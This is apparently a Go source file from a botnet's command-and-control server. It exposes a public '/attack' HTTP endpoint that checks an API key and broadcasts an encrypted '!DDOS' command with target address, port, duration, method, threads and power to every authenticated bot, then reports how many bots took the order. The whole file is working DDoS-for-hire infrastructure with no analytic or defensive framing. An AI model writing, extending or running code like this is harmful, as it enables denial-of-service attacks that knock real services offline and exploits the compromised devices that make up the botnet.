package api

import (
	//"cnc/lib/grafana"
	"cnc/lib/security"
	"cnc/lib/socket"
	"cnc/lib/utils"
	"fmt"
	"io"
	"net/http"
	"strings"
)

func sendAttack(w http.ResponseWriter, r *http.Request) {
	address := r.URL.Query().Get("address")
	method := r.URL.Query().Get("method")
	port := r.URL.Query().Get("port")
	time := r.URL.Query().Get("time")
	api_key := r.URL.Query().Get("api_key")

	if address == "" || port == "" || time == "" || method == "" || api_key == "" {
		w.WriteHeader(http.StatusBadRequest)
		io.WriteString(w, "Base path: /attack?address=0.0.0.0&port=80&time=60&method=udp&key=api_key\nExtra args: &threads=250&power=32&length=50")
		return
	}

	threads := r.URL.Query().Get("threads")
	power := r.URL.Query().Get("power")
	length := r.URL.Query().Get("length")

	if threads == "" {
		threads = "250"
	}

	if power == "" {
		power = "32"
	}

	if length == "" {
		length = "50"
	}

	if !utils.StringInList(utils.ApiKeys, api_key) {
		w.WriteHeader(http.StatusUnauthorized)
		io.WriteString(w, "Invalid API key")
		return
	}

	if !utils.StringInList(utils.Methods, method) {
		w.WriteHeader(http.StatusBadRequest)
		io.WriteString(w, fmt.Sprintf("Methods: %s", strings.Join(utils.Methods, ", ")))
		return
	}

	w.WriteHeader(http.StatusOK)
	
	// !method ip port time [thread] [power] [length]
	success := 0
	for _, bot := range socket.BotList {
		if !bot.Auth {
			continue
		}
		
		if bot.Network.Send(security.EncryptStr(fmt.Sprintf("!DDOS %s %s %s %s %s %s %s", strings.ToUpper(method), address, port, time, threads, power, length))) {
			success++
		}
	}
	
	//grafana.MethodCount.WithLabelValues(strings.ToUpper(method)).Add(1)
	utils.Debug(fmt.Sprintf("[%s] [event=attack] [user=%s] [device=%d] [target=%s:%s] [method=%s] [time=%s] [threads=%s] [power=%s] [length=%s]", r.RemoteAddr, api_key, success, address, port, method, time, threads, power, length))
	io.WriteString(w, fmt.Sprintf("attack distributed to %d bots", success))
}

func ListenPublicHttpServer() {
	http.HandleFunc("/attack", sendAttack)

	fmt.Printf("[PUB-API] Listening on port %d\n", utils.HttpApiPublicServerPort)
	err := http.ListenAndServe(fmt.Sprintf("0.0.0.0:%d", utils.HttpApiPublicServerPort), nil)
	utils.HandleError(err)

}
